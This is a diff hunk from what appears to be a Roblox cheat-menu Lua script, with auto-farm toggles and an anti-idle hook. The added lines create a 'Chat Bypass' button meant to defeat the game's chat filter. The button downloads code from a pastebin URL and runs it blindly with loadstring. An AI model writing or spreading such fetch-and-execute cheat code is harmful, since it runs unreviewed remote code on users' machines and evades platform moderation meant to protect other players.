@@ -371,6 +371,10 @@ game:GetService("Players").LocalPlayer.Idled:connect(function()
 end)
 end)
 
+Section:NewButton("Chat Bypass", "You can swear all you want lol", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/T4FEyvHH"))()
+end)
+
 local Tab = Window:NewTab("Simulator Games")
 local Section = Tab:NewSection("Lifting Simulator [Mine]")
 Section:NewToggle("Melee", "Auto Farm Melee", function(state)
